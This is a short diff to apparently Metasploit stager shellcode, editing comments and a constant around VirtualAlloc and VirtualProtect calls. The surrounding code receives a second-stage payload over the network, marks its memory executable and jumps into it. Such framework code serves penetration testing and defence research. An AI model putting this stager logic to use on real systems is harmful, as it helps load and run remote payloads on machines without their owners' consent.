@@ -258,7 +258,7 @@ module Msf
         push esi                ; push the newly recieved second stage length.
         push 0                  ; NULL as we dont care where the allocation is.
         push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
-        call ebp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
+        call ebp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_READWRITE );
         ; Receive the second stage and execute it...
         xchg ebx, eax           ; ebx = our new memory address for the new stage
         push ebx                ; push the address of the new stage so we can return into it
@@ -313,13 +313,13 @@ module Msf
         pushad                  ; preserve all registers
         mov ebx, [esp+0x20]     ; preserve lpAddress (memory address for second stage)
         mov esi, [esp+0x24]     ; preserve dwSize
-        push 0x4                ; previous protection constant (PAGE_READWRITE)
+        push 0x04                ; previous protection constant (PAGE_READWRITE)
         push esp                ; lpflOldProtect (address of previous protection constant)
         push 0x40               ; flNewProtect ("PAGE_EXECUTE_READWRITE") (0x10 "PAGE_EXECUTE" was causing problems)
         push esi                ; dwSize (size of second stage)
         push ebx                ; lpAddress (memory address for second stage)
         push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualProtect')}
-        call ebp                ; VirtualProtect( lpAddress, dwSize, PAGE_EXECUTE, lpflOldProtect )
+        call ebp                ; VirtualProtect( lpAddress, dwSize, PAGE_EXECUTE_READWRITE, lpflOldProtect )
         pop eax                 ; remove artifact from stack (return value of VirtualProtect is also on the stack)
         popad                   ; restore all registers back to initial state
         ;
